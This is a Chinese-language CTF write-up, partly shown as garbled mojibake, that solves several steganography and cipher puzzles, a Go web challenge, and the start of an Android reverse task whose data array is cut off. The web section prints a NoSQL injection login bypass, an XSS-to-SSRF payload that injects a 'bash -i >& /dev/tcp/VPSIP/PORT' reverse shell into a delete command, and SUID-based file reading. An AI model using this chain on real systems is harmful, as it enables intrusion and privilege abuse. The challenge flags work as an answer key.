æ‰“åŒ…çš„ï¼Œé‚è§£åŒ…ï¼Œå‘ç°å…¶å®åªæ˜¯é‡Šæ”¾äº†ä¸€ä¸ª problem_bak.zipã€‚ è¿è¡Œ exe å¾—åˆ°è¿™ä¸ª zipã€‚é‡Œé¢ä¸€ä¸ª ä½ æ¥äº†~ ç»å…¸é‚®ä»¶ã€‚ 6KGo5oOF5YyF5paH5YyW77yM5piv6ZqP552A572R57uc56S+5Lqk5rKf6YCa55qE5aKe5aSa5Ye6 546w55qE5LiA56eN5Li75rWB5paH5YyW44CC5LiA5Liq5Lq655qE6KGo5oOF5YyF5piv5YW26ZqQ 6JeP6LW35p2l55qE55yf5oiR77yM5LiA5Liq5Zu95a6255qE6KGo5oOF5YyF6YeM6IO955yL5Yiw 6L+Z5Liq5Zu95a6255qE6KGo5oOF44CC4oCM4oCM4oCM4oCM4oCN4oCs4oCs4oCM5pyJ5pe25YCZ 77yM6KGo5oOF5YyF6KGo6L6+55qE5piv5LiN6IO96YGT56C055qE55yf5a6e5oOz5rOV5ZKM5oSf 5Y+X77yM6K+t6KiA5ZKM5paH5a2X55qE5bC95aS077yM5bCx5piv6KGo5oOF5YyF5pa95bGV55qE 56m66Ze044CCDQrooajmg4XljIXmmK/nvZHnu5zor63oqIDnmoTkuIDnp43ov5vljJbvvIzlroPn moTkuqfnlJ/lkozmtYHooYzkuI7lhbbnibnlrprnmoTigJzigIzigIzigIzigIzigI3vu7/igI3i gI3nlJ/lrZjnjq/looPigJ3mnInlhbPjgILlhbbov73msYLphpLnm67jgIHmlrDlpYfjgIHosJDo sJHnrYnmlYjmnpznmoTnibnngrnvvIzigIzigIzigIzigIzigI3vu7/igIzigKzkuI7lubTovbvk urrlvKDmiazkuKrmgKflkozmkJ7mgKrnmoTlv4PnkIbnm7jnrKbigIzigIzigIzigIzigI3vu7/i gIzigKzjgIINCuihqOaDheWMheS5i+aJgOS7peiDveWkn+Wkp+iMg+WbtOWcsOS8oOaSre+8jOKA jOKAjOKAjOKAjOKAje+7v+KArOKAjeaYr+WboOS4uuWFtuW8peihpeS6huaWh+Wtl+S6pOa1geea hOaer+eHpeWSjOaAgeW6puihqOi+vuS4jeWHhuehrueahOW8seeCue+8jOacieaViOWcsOaPkOmr mOS6huayn+mAmuaViOeOh+OAgumDqOWIhuihqOaDheWMheWFt+acieabv+S7o+aWh+Wtl+eahOWK n+iDve+8jOKAjOKAjOKAjOKAjOKAje+7v+KAjeKAjei/mOWPr+S7peiKguecgeaJk+Wtl+aXtumX tOKAjOKAjOKAjOKAjOKAje+7v+KAjOKAjOOAgumaj+edgOaZuuiDveaJi+acuueahOWFqOmdouaZ ruWPiuWSjOekvuS6pOW6lOeUqOi9r+S7tueahOWkp+mHj+S9v+eUqO+8jOihqOaDheWMheW3sue7 j+mrmOmikeeOh+WcsOWHuueOsOWcqOS6uuS7rOeahOe9kee7nOiBiuWkqeWvueivneW9k+S4reOA gg0K base64 è§£ç ï¼Œå‘ç°æœ‰é›¶å®½éšå†™ è¡¨æƒ…åŒ…æ–‡åŒ–ï¼Œæ˜¯éšç€ç½‘ç»œç¤¾äº¤æ²Ÿé€šçš„å¢å¤šå‡ºç°çš„ä¸€ç§ä¸»æµæ–‡åŒ–ã€‚ä¸€ä¸ªäººçš„è¡¨æƒ…åŒ…æ˜¯å…¶éšè—èµ·æ¥çš„çœŸæˆ‘ï¼Œä¸€ä¸ªå›½å®¶çš„è¡¨æƒ…åŒ…é‡Œèƒ½çœ‹åˆ°è¿™ä¸ªå›½å®¶çš„è¡¨æƒ…ã€‚â€Œâ€Œâ€Œâ€Œâ€â€¬â€¬â€Œæœ‰æ—¶å€™ï¼Œè¡¨æƒ…åŒ…è¡¨è¾¾çš„æ˜¯ä¸èƒ½é“ç ´çš„çœŸå®æƒ³æ³•å’Œæ„Ÿå—ï¼Œè¯­è¨€å’Œæ–‡å­—çš„å°½å¤´ï¼Œå°±æ˜¯è¡¨æƒ…åŒ…æ–½å±•çš„ç©ºé—´ã€‚ è¡¨æƒ…åŒ…æ˜¯ç½‘ç»œè¯­è¨€çš„ä¸€ç§è¿›åŒ–ï¼Œå®ƒçš„äº§ç”Ÿå’Œæµè¡Œä¸å…¶ç‰¹å®šçš„â€œâ€Œâ€Œâ€Œâ€Œâ€ â€â€ç”Ÿå­˜ç¯å¢ƒâ€æœ‰å…³ã€‚å…¶è¿½æ±‚é†’ç›®ã€æ–°å¥‡ã€è°è°‘ç­‰æ•ˆæœçš„ç‰¹ç‚¹ï¼Œâ€Œâ€Œâ€Œâ€Œâ€ â€Œâ€¬ä¸å¹´è½»äººå¼ æ‰¬ä¸ªæ€§å’Œææ€ªçš„å¿ƒç†ç›¸ç¬¦â€Œâ€Œâ€Œâ€Œâ€ â€Œâ€¬ã€‚ è¡¨æƒ…åŒ…ä¹‹æ‰€ä»¥èƒ½å¤Ÿå¤§èŒƒå›´åœ°ä¼ æ’­ï¼Œâ€Œâ€Œâ€Œâ€Œâ€ â€¬â€æ˜¯å› ä¸ºå…¶å¼¥è¡¥äº†æ–‡å­—äº¤æµçš„æ¯ç‡¥å’Œæ€åº¦è¡¨è¾¾ä¸å‡†ç¡®çš„å¼±ç‚¹ï¼Œæœ‰æ•ˆåœ°æé«˜äº†æ²Ÿé€šæ•ˆç‡ã€‚éƒ¨åˆ†è¡¨æƒ…åŒ…å…·æœ‰æ›¿ä»£æ–‡å­—çš„åŠŸèƒ½ï¼Œâ€Œâ€Œâ€Œâ€Œâ€ â€â€è¿˜å¯ä»¥èŠ‚çœæ‰“å­—æ—¶é—´â€Œâ€Œâ€Œâ€Œâ€ â€Œâ€Œã€‚éšç€æ™ºèƒ½æ‰‹æœºçš„å…¨é¢æ™®åŠå’Œç¤¾äº¤åº”ç”¨è½¯ä»¶çš„å¤§é‡ä½¿ç”¨ï¼Œè¡¨æƒ…åŒ…å·²ç»é«˜é¢‘ç‡åœ°å‡ºç°åœ¨äººä»¬çš„ç½‘ç»œèŠå¤©å¯¹è¯å½“ä¸­ã€‚ åˆ° é›¶å®½éšå†™ è§£å¯†ä¸€ä¸‹ï¼Œç”¨åˆ°çš„å­—ç¬¦ vim çœ‹ä¸€ä¸‹å°±è¡Œã€‚ å¾—åˆ° hurryupï¼Œç›²çŒœæ˜¯æŸä¸ªåŠ å¯†çš„å¯†ç ã€‚ å†çœ‹é‚®ä»¶é‡Œè¿˜æœ‰å¼ å›¾ç‰‡ï¼Œbase64 è§£ç å¯¼å‡ºåˆ°æ–‡ä»¶ã€‚ OurSecret è§£å¯†å¾—åˆ° flagã€‚ flag{f3a5dc36-ad43-d4fa-e75f-ef79e2e28ef3} JumpJumpTiger flagæ ¼å¼ä¸ºflag{uuid} é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ æ˜¯è·³è·³è™å•Šï¼ˆ ç»™äº†ä¸ª jump.exeï¼Œè¿è¡Œå°±è¾“å‡ºä¸€å¥è¯ This is your hint!!! æ‹–è¿› IDAï¼Œå‘ç°å®ƒè¿™é‡Œå…¶å®è¿™ä¸ª v4 æ•°ç»„ä¹Ÿå°±æ˜¯å‰åæŠŠå¥‡æ•°ä½å’Œå¶æ•°ä½åˆ†å¼€çš„æ“ä½œã€‚ ç„¶åçœ‹ strings çª—å£ï¼Œå‘ç°æœ‰ä¸€å †çœ‹ä¸Šå»åƒ base64 çš„å­—ç¬¦ä¸²ï¼Œç„¶è€Œè§£æä¸å‡ºæ¥ã€‚ ä¸‹é¢ä¸¤ä¸ªå¾ˆæ˜æ˜¾æ˜¯éš”ä½æ¥å–å€¼ï¼Œäºæ˜¯æ¯”èµ›çš„æ—¶å€™å°±è€ƒè™‘äº†å„ç§æ–¹æ³•æŠŠè¿™ä¸‰ä¸ªå­—ç¬¦ä¸²çš„å¥‡æ•°ä½å’Œå¶æ•°ä½åˆ†å¼€ï¼Œæˆ–è€…æŒ‰ä¸åŒé¡ºåºæ’åˆ—å¥‡æ•°ä½å’Œå¶æ•°ä½ã€‚ç„¶è€Œä¸ç®¡å•¥æ ·éƒ½è§£æä¸å‡ºä¸€ä¸ªçœ‹å¾—å‡ºæ¥çš„ä¸œè¥¿â€¦â€¦ èµ›åé—®äº†ä¸‹å…¶ä»–å¸ˆå‚…ï¼Œè¯´ç›´æ¥åå…­è¿›åˆ¶ç¼–è¾‘å™¨å¤åˆ¶å‡ºæ¥ï¼Œå¥‡å¶ä½åˆ†å¼€å°±å®Œäº‹äº†ã€‚ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ å–µå–µç–‘æƒ‘è„¸.jpg ç„¶åæ‹–è¿› 010 editor ä¸€çœ‹ï¼Œè‰ï¼ŒIDA è§£æé”…äº†å•Šï¼ï¼ï¼ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè¿™ä¸ª strings window è§£æå‡ºæ¥çš„å­—ç¬¦ä¸²åˆ†æ®µäº†ï¼Œè€Œä¸”å¯¼å‡ºæ¥ä¹Ÿä¸å®Œæ•´ã€‚ è€Œå®é™…ä¸Šè¿™ä¸€é•¿ä¸²å­—ç¬¦ä¸²éƒ½æ˜¯è¿åœ¨ä¸€èµ·çš„ã€‚äºæ˜¯ç›´æ¥åœ¨ 010 Editor é‡Œæ•´ä¸ªå¤åˆ¶å‡ºæ¥ã€‚ ç„¶åå¥‡å¶ä½åˆ†åˆ«å¯¼å‡ºåˆ°ä¸¤ä¸ªæ–‡ä»¶ã€‚ import base64 with open('base64.dat', 'r', encoding='utf-8') as fin: s = fin.read() s1 = ''.join([s[i] for i in range(0, len(s), 2)]) s2 = ''.join([s[i] for i in range(1, len(s), 2)]) data1 = base64.b64decode(s1) data2 = base64.b64decode(s2) print(data1[:200]) print('======') print(data2[:200]) with open('data1.jpg', 'wb') as f1: f1.write(data1) with open('data2.png', 'wb') as f1: f1.write(data2) # b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x01\\x00\\x01\\x00\\x01\\x00\\x00\\xff\\xdb\\x00C\\x00\\x05\\x03\\x04\\x04\\x04\\x03\\x05\\x04\\x04\\x04\\x05\\x05\\x05\\x06\\x07\\x0c\\x08\\x07\\x07\\x07\\x07\\x0f\\x0b\\x0b\\t\\x0c\\x11\\x0f\\x12\\x12\\x11\\x0f\\x11\\x11\\x13\\x16\\x1c\\x17\\x13\\x14\\x1a\\x15\\x11\\x11\\x18!\\x18\\x1a\\x1d\\x1d\\x1f\\x1f\\x1f\\x13\\x17\"$\"\\x1e$\\x1c\\x1e\\x1f\\x1e\\xff\\xdb\\x00C\\x01\\x05\\x05\\x05\\x07\\x06\\x07\\x0e\\x08\\x08\\x0e\\x1e\\x14\\x11\\x14\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\xff\\xc0\\x00\\x11\\x08\\x048\\x07\\x80\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01\\xff\\xc4\\x00\\x1d\\x00\\x00\\x02\\x02\\x03\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02' # ====== # b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x07\\x80\\x00\\x00\\x048\\x08\\x02\\x00\\x00\\x00g\\xb1V\\x14\\x00\\x00 \\x00IDATx\\x01d\\xc1A\\x96,\\xe7\\x96\\x9c\\xd7\\xcf\\xec\\xb8\\'\\x00R\\xf3\\x9f\\x15\\xd5\"G\\xc0Zj\\xabA\\xb2\\xde\\xcd\\xf8\\x8f\\x19#\\x1cH\\xea\\xd6\\xd2\\xde\\xfa\\xef\\xff\\xf5\\xbf\\xf4\\x07\\xd06I\\xdb$\\x92l_\\xd753\\xb6\\x81\\xb6\\xbb\\xcbC\\x12\\xbfI\\x97\\xb7\\nl_b@\\x80\\xfc\\xdd\\xaa\\xad&gt;*\\x93\\x9c$m\\x81\\x8aGT\\x0c*\\xbe\\x06P\\xf9H\\xd5v\\xd3\\xf6\\x17\\xb3\\xbb\\xb6\\xff\\xfc\\xf3\\x0fI\\xaf\\xd7+9\\xb6\\xff\\xb8\\xd5\\xf6\\x9c\\xb3\\xbb\\x92\\xae\\xeb\\x92\\xc4[\\xdd\\x1f\\x92lK\\xb2\\xdd6\\x8f\\xb6#\\xf1\\xc3\\xba$\\xf1\\xe8#I\\xdb\\xfft{\\xe5\\x15\\xc7.\\x06T\\x01G' å¾—åˆ°ä¸¤å¼ å›¾ï¼Œä¸€å¼  jpg ä¸€å¼  pngã€‚ è¿›è¡Œä¸€ä¸ª diffï¼ŒSUB å¾ˆæ˜æ˜¾çœ‹å‡ºå°±æ˜¯ç†Ÿæ‚‰çš„ç»å…¸ç›²æ°´å°ã€‚ä¸€å¼ æ˜¯åŸå›¾ï¼Œä¸€å¼ æ˜¯åŠ äº†ç›²æ°´å°çš„ pngã€‚ è¿™é‡Œç”¨åˆ°çš„æ˜¯ chishaxie çš„ BlindWaterMarkã€‚ python bwmforpy3.py decode data1.jpg data2.png out.png å‘ï¼Œflagã€‚ where_can_find_code é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ç»™äº†ä¸ª code.ascï¼Œå‘ç°è¿™ä¸ªæ–‡ä»¶é‡Œæœ‰ä¸€å †çš„ \\0. å°è¯•ç€æ‹¿å»å½“ html è§£æï¼Œæ•ˆæœé•¿è¿™æ ·ã€‚ ï¼ˆå¥½åƒä¹Ÿæ²¡å•¥ç”¨ï¼‰ ä¸‹é¢è¿™æ®µé•¿å¾—å°±å¾ˆåƒ flagï¼Œåº”è¯¥æ˜¯æŸç§æ˜ å°„å…³ç³»ã€‚ç„¶è€Œç›´æ¥æ‹¿å» quipquip è§£çš„è¯å‡ºæ¥éƒ½ä¸å¯¹ã€‚ format(\"Translate the letter J into I\"); dpeb{e58ca5e2-2c51-4eef-5f5e-33539364deoa} å†å›åˆ°æœ€å¼€å§‹çš„ \\0ï¼Œå‘ç°æ˜¯ç”¨äº† wbStego éšå†™ã€‚ password ä¸ºç©ºï¼Œè§£å¯†å‡ºæ¥å¾—åˆ° 20810842042108421 åªå«æœ‰ 01248ï¼Œæ˜¯é‚£ä¸ª äº‘å½±å¯†ç ã€‚ å®é™…ä¸Šå°±æ˜¯ä»¥ 0 ä½œä¸ºé—´éš”ï¼Œå…¶ä»–æ•°éš”å¼€ååè¿›åˆ¶ç»„åˆç›¸åŠ ï¼Œè½¬åŒ–ä¸º 1-26 å¯¹åº”çš„å­—æ¯ A-Z. ç›´æ¥æŠ„ä¸ªç½‘ä¸Šçš„è„šæœ¬å¥½äº†ã€‚ def de_code(c): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] flag = [] c2 = [i for i in c.split(\"0\")] for i in c2: c3 = 0 for j in i: c3 += int(j) flag.append(dic[c3 - 1]) return flag def encode(plaintext): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] m = [i for i in plaintext] tmp = [] flag = [] for i in range(len(m)): for j in range(len(dic)): if m[i] == dic[j]: tmp.append(j + 1) for i in tmp: res = \"\" if i &gt;= 8: res += int(i/8)*\"8\" if i % 8 &gt;= 4: res += int(i % 8/4)*\"4\" if i % 4 &gt;= 2: res += int(i % 4/2)*\"2\" if i % 2 &gt;= 1: res += int(i % 2/1)*\"1\" flag.append(res + \"0\") print(\"\".join(flag)[:-1]) c = input(\"è¾“å…¥è¦è§£å¯†çš„æ•°å­—ä¸²:\") print(de_code(c)) # m_code = input(\"è¯·è¾“å…¥è¦åŠ å¯†çš„æ•°å­—ä¸²:\") # encode(m_code) å¾—åˆ° BINGO å†å»æœ Translate the letter J into Iï¼Œå‘ç°æ˜¯ å¤šè¡¨ä»£æ¢åŠ å¯† é‡Œçš„ Playfair cipherã€‚ æœ‰ä¸€ä¸ª åœ¨çº¿çš„ Playfair Cipher å·¥å…· å¯ä»¥ç›´æ¥åœ¨ç½‘é¡µä¸Šç¼–è§£ç ã€‚ flag{d58af5d2-2a51-4dde-5e5d-33539364cdbf} WebOldLibrary é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ æ˜¯ä¸ª golang çš„é¢˜ç›®ã€‚è™½ç„¶å’±ä¸ä¼š golangï¼Œä½†ç»™äº†æºç è€Œä¸æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹èµ·æ¥è¿˜æ˜¯æŒºèˆ’æœçš„ã€‚ é¦–å…ˆçœ‹å„ä¸ªæ¥å£ router.POST(\"/delete\", handler.IPCheckMiddleWare(), DeleteController) router.POST(\"/signin\", LoginController) router.POST(\"/signup\", RegisterController) router.POST(\"/download\", handler.LoginCheckMiddleWare(), DownloadController) router.POST(\"/submit\", handler.AdminCheckMiddleWare(), BookHandleController) å‘ç°ç™»å½•è¿™é‡Œï¼Œsql æŸ¥è¯¢ç›´æ¥æ‹¼æ¥äº†å­—ç¬¦ä¸² db_table := Conn.DB(\"ctf\").C(\"users\") result := User{} err = db_table.Find(bson.M{\"$where\":\"function() {if(this.username == '\"+user.Username+\"' &amp;&amp; this.password == '\"+user.Password+\"') {return true;}}\"}).One(&amp;result) è€Œ handler è¿™é‡Œé¢æç¤ºäº†ç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ administrator äºæ˜¯æ„é€ ç™»å½•è¯·æ±‚ username=administrator&amp;password=1' || '1'=='1 æˆåŠŸç™»å½•ã€‚ ç„¶åå†çœ‹æ¥å£ï¼Œå‘ç°æœ‰ä¸ª /deleteï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸”æ˜¯æ‹¼æ¥å­—ç¬¦ä¸²ã€‚ func DeleteController(c *gin.Context) { // The function is temporarily inaccessible var filename Filename if err := c.ShouldBindJSON(&amp;filename); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } cmd := exec.Command(\"/bin/bash\", \"-c\", \"rm ./upload/pdf/\" + filename.Filename) if err := cmd.Run(); err != nil { fmt.Println(err) return } c.String(http.StatusOK, fmt.Sprintf(\"File Deleted Successfully\")) } ç„¶è€Œè¿™ä¸ªåªèƒ½é€šè¿‡æœ¬åœ°è¿›è¡Œè®¿é—®ã€‚ func IPCheckMiddleWare() gin.HandlerFunc { return func(c *gin.Context) { if c.Request.RemoteAddr[:9] != \"127.0.0.1\" &amp;&amp; c.Request.RemoteAddr[:9] != \"localhost\" { c.JSON(403, gin.H{\"msg\": \"I'm sorry, your IP is forbidden\"}) return } c.Next() } } å†çœ‹ /submit æ¥å£è¿™é‡Œï¼Œå¯ä»¥ä¸Šä¼  pdfï¼Œè€Œè¿™äº›è¾“å…¥çš„ä¿¡æ¯ä¼šè¿›åˆ° makepdf å‡½æ•°é‡Œã€‚ func BookHandleController(c *gin.Context) { var book Book if err := c.ShouldBind(&amp;book); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } file, err := c.FormFile(\"covers\") if err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Get form err: %s\", err.Error())) return } filename := filepath.Base(file.Filename) if err := c.SaveUploadedFile(file, \"/tmp/covers/\" + filename); err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Upload covers err: %s\", err.Error())) return } makepdf(book.Title, book.Author, book.Description, filename) db_table := Conn.DB(\"ctf\").C(\"books\") err = db_table.Insert(&amp;book) if err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Signup err: %s\", err.Error())) return } c.Header(\"Content-Type\", \"text/html; charset=utf-8\") c.String(200, \"&lt;script&gt;alert('Book uploaded successfully');window.location.href='/submit'&lt;/script&gt;\") } makepdf å‡½æ•°é‡Œç›´æ¥å°†è¾“å…¥çš„ä¸œè¥¿æ‹¼æ¥è¿› html é‡Œäº†ï¼Œç„¶åç”Ÿæˆ pdfï¼Œäºæ˜¯æƒ³åˆ°åœ¨è¿™é‡Œæ„é€  XSS æ¥è¿›è¡Œ SSRFã€‚ func makepdf(title, author, description, covers string) string { // Create new PDF generator pdfg, err := wkhtmltopdf.NewPDFGenerator() if err != nil { fmt.Println(err) } template := \"&lt;!DOCTYPE html&gt;\" + \"&lt;html lang='en'&gt;\" + \"&lt;head&gt;\" + \"&lt;meta charset='UTF-8'&gt;\" + \"&lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;\" + \"&lt;title&gt;Library&lt;/title&gt;\" + \"&lt;/head&gt;\" + \"&lt;body&gt;\" + \"&lt;center&gt;\" + \"&lt;h2&gt;Book description&lt;/h2&gt;\" + \"&lt;table border='1' cellpadding='10'&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt;Book Title&lt;/th&gt;\" + \"&lt;td&gt;\" + title + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt;Author&lt;/th&gt;\" + \"&lt;td&gt;\" + author + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt; Content Abstract &lt;/th&gt;\" + \"&lt;td&gt;\" + description + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;/table&gt;\" + \"&lt;br&gt;&lt;img src='covers/\" + covers + \"' height='300'&gt;\" + \"&lt;/center&gt;\" + \"&lt;/body&gt;\" + \"&lt;/html&gt;\" pdfg.AddPage(wkhtmltopdf.NewPageReader(strings.NewReader(template))) err = pdfg.Create() if err != nil { fmt.Println(err) } æ„é€  description å¦‚ä¸‹ï¼Œåå¼¹ä¸ª shell å›æ¥ã€‚ &lt;/td&gt;&lt;script&gt;var s=new XMLHttpRequest;s.open(\"POST\",\"http://127.0.0.1:8888/delete\"); s.setRequestHeader('Content-type', 'application/json');s.send('{\"filename\":\"test.pdf|bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1\"}');&lt;/script&gt;&lt;td&gt; VPS ä¸Šæ¥æ”¶åˆ°åå¼¹çš„ shell å‘ç° flag åœ¨ /flagggisshere ä½†æ˜¯æ²¡æƒé™è¯»ï¼Œæ‰¾æ‰¾èƒ½ä¸èƒ½å€ŸåŠ© suid æƒé™æ¥è¯»ã€‚ $ find / -perm -u=s -type f 2&gt;/dev/null /usr/lib/xorg/Xorg.wrap /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/sbin/pppd /usr/bin/chsh /usr/bin/mount /usr/bin/chfn /usr/bin/comm /usr/bin/newgrp /usr/bin/passwd /usr/bin/su /usr/bin/gpasswd /usr/bin/umount /usr/bin/pkexec $ ls -al /usr/bin/comm -rwsr-xr-x 1 root root 43384 Sep 5 2019 comm $ comm /flagggisshere /dev/null 2&gt;/dev/null flag{a4a22262-4d19-4956-ba7c-6ac805a99785} comm SUID è¯»æ–‡ä»¶çš„ä»‹ç» Reverseè¿™éƒ¨åˆ†é¢˜ç›®æ˜¯é˜Ÿå‹åšçš„ï¼Œå–µå–µèœèœï¼Œå–µå‘œã€‚ hello hello world! é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ åœ¨ Java ä¸­è·å–ç”¨æˆ·è¾“å…¥ä»¥åŠ apk çš„ç­¾åï¼Œå¹¶è°ƒç”¨ JNI å‡½æ•° stringFromJNI è¿›è¡ŒåŠ å¯†ã€‚ ä¸»ä½“éƒ¨åˆ†ä¸ºä¸€ä¸ªå¼‚æˆ–åŠ å¯†ä»¥åŠäº¤æ¢æ¯ä¸ªå­—ç¬¦çš„å‰äº”ä½ä¸åä¸‰ä½ï¼Œä½¿ç”¨è°ƒè¯•æ‰‹æ®µè·å–ç­¾ååå³å¯å†™å‡ºè§£å¯†ä»£ç ã€‚ target = [0xca, 0xeb, 0x4a, 0x8a, 0x68, 0xe1, 0xa1, 0xeb, 0xe1, 0xee, 0x6b, 0x84, 0xa2, 0x6d, 0x49, 0xc8, 0x8e, 0xe, 0xcc, 0xe9, 0x45, 0xcf, 0x23, 0xcc, 0xc5, 0x4c, 0xc, 0x85, 0xcf, 0xa9, 0x8c, 0xf6, 0xe6, 0xd6, 0x26, 0x6d, 0xac, 0xc, 0xac, 0x77, 0xe0, 0x64] sig = [0x33, 0x30, 0x38, 0x32, 0x30, 0x32, 0x65, 0x34, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x63, 0x63, 0x30, 0x32, 0x30, 0x31, 0x30, 0x31, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x35, 0x30, 0x30, 0x33, 0x30, 0x33, 0x37, 0x33, 0x31, 0x31, 0x36, 0x33, 0x30, 0x31, 0x34, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x33, 0x30, 0x63, 0x30, 0x64, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x32, 0x30, 0x34, 0x34, 0x36, 0x35, 0x36, 0x32, 0x37, 0x35, 0x36, 0x37, 0x33, 0x31, 0x31, 0x30, 0x33, 0x30, 0x30, 0x65, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x61, 0x30, 0x63, 0x30, 0x37, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x33, 0x31, 0x30, 0x62, 0x33, 0x30, 0x30, 0x39, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x36, 0x31, 0x33, 0x30, 0x32, 0x35, 0x35, 0x35, 0x33, 0x33, 0x30, 0x32, 0x30, 0x31, 0x37, 0x30, 0x64, 0x33, 0x32, 0x33, 0x31, 0x33, 0x30, 0x33, 0x33, 0x33, 0x30, 0x33, 0x36, 0x33, 0x31, 0x33, 0x34, 0x33, 0x33, 0x33, 0x30, 0x33, 0x34, 0x33, 0x38, 0x35, 0x61, 0x31, 0x38, 0x30, 0x66, 0x33, 0x32, 0x33, 0x30, 0x33, 0x35, 0x33, 0x31, 0x33, 0x30, 0x33, 0x32, 0x33, 0x32, 0x33, 0x37, 0x33, 0x31, 0x33, 0x34, 0x33, 0x33, 0x33, 0x30, 0x33, 0x34, 0x33, 0x38, 0x35, 0x61, 0x33, 0x30, 0x33, 0x37, 0x33, 0x31, 0x31, 0x36, 0x33, 0x30, 0x31, 0x34, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x33, 0x30, 0x63, 0x30, 0x64, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x32, 0x30, 0x34, 0x34, 0x36, 0x35, 0x36, 0x32, 0x37, 0x35, 0x36, 0x37, 0x33, 0x31, 0x31, 0x30, 0x33, 0x30, 0x30, 0x65, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x61, 0x30, 0x63, 0x30, 0x37, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x33, 0x31, 0x30, 0x62, 0x33, 0x30, 0x30, 0x39, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x36, 0x31, 0x33, 0x30, 0x32, 0x35, 0x35, 0x35, 0x33, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x32, 0x32, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x30, 0x30, 0x33, 0x38, 0x32, 0x30, 0x31, 0x30, 0x66, 0x30, 0x30, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x30, 0x61, 0x30, 0x32, 0x38, 0x32, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x63, 0x62, 0x66, 0x32, 0x62, 0x30, 0x39, 0x65, 0x34, 0x33, 0x30, 0x38, 0x65, 0x62, 0x62, 0x34, 0x35, 0x39, 0x65, 0x38, 0x38, 0x34, 0x31, 0x65, 0x35, 0x61, 0x37, 0x62, 0x39, 0x32, 0x30, 0x34, 0x39, 0x37, 0x66, 0x65, 0x66, 0x32, 0x62, 0x33, 0x34, 0x39, 0x65, 0x38, 0x30, 0x36, 0x34, 0x38, 0x66, 0x37, 0x65, 0x62, 0x33, 0x35, 0x66, 0x34, 0x38, 0x64, 0x34, 0x30, 0x61, 0x37, 0x35, 0x65, 0x37, 0x63, 0x65, 0x37, 0x39, 0x34, 0x35, 0x62, 0x38, 0x62, 0x34, 0x32, 0x64, 0x31, 0x39, 0x37, 0x62, 0x65, 